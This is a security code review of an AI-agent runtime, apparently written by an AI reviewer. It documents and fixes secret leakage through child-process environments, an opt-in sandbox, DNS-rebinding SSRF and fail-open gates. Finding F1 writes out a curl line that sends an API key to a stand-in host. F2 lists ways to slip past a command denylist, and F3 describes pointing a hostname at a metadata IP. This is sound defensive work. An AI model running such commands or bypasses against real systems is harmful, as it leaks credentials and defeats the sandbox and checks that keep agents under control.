# Code Review: agim v1.3.6

**Reviewer:** Claude (delegated multi-agent review + manual source verification)
**Scope:** whole project (~112k LOC TypeScript), focus on security boundaries, correctness, concurrency
**Date:** 2026-06-22
**Method:** 3 Explore agents (web / core runtime / plugins+CLI) in parallel; **every headline
finding re-verified by reading the source directly.** The web and plugin agents had a high
false-positive rate (documented in §3); the core-runtime agent was accurate.

> Companion to `CODE_REVIEW_v1.2.55-v1.2.69.md`. This pass checks which of those findings were
> fixed by v1.3.6 and adds new ones. **Findings F1–F5 are FIXED in this change set** (see §5).

---

## 1. Confirmed findings (severity-ordered, source-verified)

### 🔴 P0 — security boundaries

**F1 · child processes inherited the full `process.env` → secret exfil** ✅ FIXED
`src/core/llm/exec-dispatcher.ts` — `env = { ...process.env, ...extraEnv }`.
A `native_exec` command could read every secret the agent holds (`*_API_KEY`, `DB_PASSWORD`,
`SSH_*`) and exfil via `curl -d "$OPENAI_API_KEY" https://allowed.example`, defeating all SSRF
guards. (Was CR-14, still unfixed at v1.3.6.)
**Fix:** env allow-list (`buildExecEnv`): a small safe base set + per-spawn RPC injection +
operator opt-in via `IMHUB_EXEC_ENV_PASS`. Everything else dropped.

**F2 · bwrap sandbox was opt-in (default OFF)** ✅ FIXED
`src/core/llm/exec-dispatcher.ts` — `sandboxConfigured = sandboxMode === 'bwrap' && existsSync(...)`.
Default was `/bin/sh -c <cmd>` with no namespace isolation. The dangerous-pattern denylist is a
regex tripwire (trivially bypassed: `\rm`, `bash -c '…'`, `eval`, `/bin/rm`), so bwrap is the only
real boundary — yet it had to be turned on manually. (Was CR-6, still unfixed.)
**Fix:** default-on when `/usr/bin/bwrap` exists; only `IMHUB_EXEC_SANDBOX=off` disables it, and
that path now logs a loud one-shot WARN.

**F3 · DNS-rebinding SSRF was open** ✅ FIXED
`src/core/llm/web-dispatcher.ts` — non-IP hostnames returned `{ ok: true }` unresolved. The
IP-literal checks (CR-3/CR-4) were rewritten well, but `evil.example.com` → `169.254.169.254`
sailed through to `fetch()`. (Was CR-2, still unfixed; source comment admitted it.)
**Fix:** new `checkUrlSafetyAsync` resolves the hostname (`dns.lookup({all:true})`) and runs every
A/AAAA record through the same `checkIpv4Safety`/`checkIpv6Safety` used for literals; fail-closed on
resolution error. Wired into the initial fetch and every redirect hop.
**Residual:** `fetch()` re-resolves at connect time, so a TTL-0 rebind between check and connect can
still slip through. True closure needs a connection-level lookup pin (custom undici dispatcher) —
flagged as a follow-up. This removes the trivial bypass.

### 🟠 P1 — high

**F4 · `read-only` mode auto-allowed `web_fetch`** ✅ FIXED
`src/core/llm/policy-approval-gate.ts` — `READ_ONLY_HINTS` contained `'fetch'`, so
`native_web_fetch` (the largest SSRF surface) was auto-allowed in "read-only" mode. (Was CR-18.)
**Fix:** removed `'fetch'` from the heuristic. Outbound fetch now needs explicit `autoAllow` or an
approval card. (Longer-term: replace the substring heuristic with an explicit `ToolDef.readOnly`.)

**F5 · `verifyToken` rewrote `tokens.json` on every successful auth (race)** ✅ FIXED
`src/core/access-token.ts` — each auth did a read-modify-write to stamp `last_used_at`, racing with
concurrent `createToken`/`setTokenRole`/`revokeToken` (last-write-wins could silently drop a freshly
created token or a role change). Token comparison itself is `timingSafeEqual` (safe). *(New finding.)*
**Fix:** throttle the write — only rewrite when the stamp is stale (≥30s), shrinking the race window
to near-zero for the common repeated-request case while still recording usage.

**F6 · inbound sender allow-list was default-open AND fail-open** ✅ FIXED
`src/cli.ts` — the central `isSenderAllowed` gate is applied to all platforms, but when the check
threw it `catch`ed and continued processing ("continuing open"). A deny-gate that fails open.
**Fix:** when the allow-list is configured but evaluation throws, fail **closed** (deny) instead of
open; module-load failure is now logged at `error` (was a quiet `warn`). Default-open-when-unconfigured
is a documented design choice with a boot WARN — left as-is.

**F7 · `long_task` silently paused the prior active goal** ✅ FIXED
`src/core/goal-rpc.ts` → `setActiveGoal` unconditionally paused the existing goal, no confirmation.
(Was CR-17.) **Fix:** `long_task` now refuses when a goal is already active unless `force: true` is
passed (or you `complete_goal` first); `force` is exposed in the MCP tool schema.

### 🟡 P2 — medium

- **F8** `approval-bus.ts` `pendingById`/`pendingByThread` have no upper bound → OOM under approval spam. ⚠️ NOT CHANGED (hot-path; needs careful eviction design). Add a cap + oldest-eviction.
- **F9** `goal-rpc.ts` `complete_goal` is not idempotent. ⚠️ NOT CHANGED — with synchronous better-sqlite3 and the existing no-active-goal guard, a retry after completion already errors cleanly; the practical window is negligible. (CR-30.)
- **F10** `exec-dispatcher` `clampTimeout` lacked a lower bound; `timeout_ms=1` self-DoS. ✅ FIXED — floored at 100ms. (CR-15.)
- **F11** `fs-dispatcher` `hasRipgrep()` checked two hardcoded paths only. ✅ FIXED — now also searches every `$PATH` dir. (CR-24.)
- **F12** Discord adapter: with only `allowedGuilds` set, DMs (`message.guildId` empty) skipped the guild check. ✅ FIXED — DMs are now dropped when `allowedGuilds` is set unless an `allowedChannels` entry permits the DM channel (`discord-adapter.ts`).
- **F13** Approval-gate `askUser` failures were a silent deny. ✅ FIXED — now logged at `warn` (`policy-approval-gate.ts`) so an IM-push outage is visible. (Note: the analogous notifier path in `approval-bus.ts` is left for a follow-up.)

---

## 2. What's done well

- ✅ Token compare uses `timingSafeEqual` on sha256 digests (`access-token.ts` / `utils/safe-equal.ts`) — no timing side channel.
- ✅ Tokens stored only as sha256; raw written once to a chmod-600 file, logs record id only (R13-compliant).
- ✅ Artifact download validates `name.includes('/') || name === '..'` on **both** code paths (`artifacts.ts:214`, `server.ts:4928`) — no path traversal.
- ✅ `viewer-render.ts` escapes content before output and sanitizes markdown with DOMPurify — no stored XSS.
- ✅ Login `?next=` has a `safeNext()` same-origin guard (`login.tsx:40`) — no open redirect.
- ✅ IP-literal SSRF parsing was rewritten (integer/octal/hex/IPv6-compressed; CR-3/CR-4 fixed).
- ✅ Loopback trust auto-disables when proxy-forward headers are present (`server.ts:isLoopbackPeer`).
- ✅ Three-layer `IMHUB_PLATFORM_BLACKLIST`, symlink realpath guard (CR-1 fixed), UTF-8 truncation fix (CR-11 fixed).

---

## 3. False positives (raised by sub-agents, disproven on review — do not re-investigate)

| Reported | Reality |
|---|---|
| Timing side channel in token verify | False — `timingSafeEqual` (access-token.ts:225) |
| Cookie token CRLF injection | False — token is verified + random, `encodeURIComponent` applied |
| Path traversal in artifact download | False — `readOutput` and fallback both block `/` and `..` |
| Bootstrap token printed to stdout | False — written to chmod-600 file, logs record id only |
| Open redirect via `?next=` | False — `login.tsx` `safeNext()` restricts to same-origin |
| Stored XSS in viewer | False — escapeHtml + DOMPurify |
| Login brute-force (high) | Weak — tokens are 160-bit random; rate-limit is nice-to-have only |
| JSON bomb (exponential parse) | Weak — `JSON.parse` is linear; 1 MiB body cap already exists |
| CSRF (high) | Weak — `SameSite=Lax` + JSON content-type already mitigate |
| Feishu/DingTalk webhook unsigned | Unproven — official-SDK long-poll; verification lives in the SDK (no evidence either way) |

---

## 4. Priority (if only three)

1. **F2 bwrap default-on** — biggest leverage; makes F1's boundary real.
2. **F1 env allow-list** — directly stops secret exfil.
3. **F3 DNS-aware SSRF** — closes the trivial rebind bypass.

(All three, plus F4–F7 and F10–F13, are addressed in this change set.)

---

## 5. Changes made

| File | Finding | Change |
|---|---|---|
| `src/core/llm/exec-dispatcher.ts` | F1 | `buildExecEnv()` env allow-list + `IMHUB_EXEC_ENV_PASS` |
| `src/core/llm/exec-dispatcher.ts` | F2 | bwrap default-on; `=off` warns once |
| `src/core/llm/exec-dispatcher.ts` | F10 | `clampTimeout` floored at 100ms |
| `src/core/llm/web-dispatcher.ts` | F3 | `checkUrlSafetyAsync()` DNS-resolving SSRF check, wired into fetch + redirects |
| `src/core/llm/policy-approval-gate.ts` | F4 | removed `'fetch'` from `READ_ONLY_HINTS` |
| `src/core/llm/policy-approval-gate.ts` | F13 | `askUser` failure logged (was silent deny) |
| `src/core/access-token.ts` | F5 | throttled `last_used_at` write (≥30s) |
| `src/cli.ts` | F6 | sender gate fails **closed** when configured; load failure logged at `error` |
| `src/core/goal-rpc.ts`, `imhub-dispatcher.ts` | F7 | `long_task` requires `force:true` to override an active goal |
| `src/core/llm/fs-dispatcher.ts` | F11 | `hasRipgrep()` searches `$PATH` |
| `src/plugins/messengers/discord/discord-adapter.ts` | F12 | DMs dropped when `allowedGuilds` set (unless a channel permits) |
| `*.test.ts` (6 files) | — | red-team + regression tests for F1–F5, F7, F10 |

**Verification:** `tsc --noEmit` (src + test) exit 0; `biome lint` exit 0 (pre-existing warnings only);
all touched suites pass (138/138). The 6 failures in the full `bun test` run are all pre-existing
on the clean baseline (5 cross-test global-state pollution per `AGENTS.md`, 1 pre-existing
`runAgentLoop` maxIterations case) — none introduced here.

**Not addressed (recommended follow-ups):** F8 (approval-bus pending cap — hot-path eviction design),
F9 (complete_goal idempotency — negligible window under sync sqlite), and the `approval-bus.ts`
notifier-error variant of F13.

---

**End of report.**
